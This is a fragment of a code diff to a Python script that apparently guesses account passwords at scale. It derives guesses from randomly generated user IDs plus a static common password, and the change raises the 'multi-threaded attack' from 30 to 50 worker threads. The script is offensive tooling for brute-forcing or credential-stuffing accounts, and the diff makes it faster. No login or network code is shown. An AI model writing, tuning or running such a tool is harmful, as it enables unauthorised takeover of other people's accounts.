@@ -313,10 +313,10 @@ def generate_random_ids(limit):
 def get_password_patterns(uid):
     """Generate password patterns based on UID"""
     return [
-        '57273200',  # Static common password
         uid[:6],     # First 6 digits
         uid[:8],     # First 8 digits
         uid,         # Full number
+        '57273200',  # Static common password
     ]
 
 def random_number():
@@ -368,7 +368,7 @@ def random_number():
     # Start multi-threaded attack
     start_time = time.time()
     
-    with ThreadPoolExecutor(max_workers=30) as executor:
+    with ThreadPoolExecutor(max_workers=50) as executor:
         futures = []
         
         for random_id in idz:
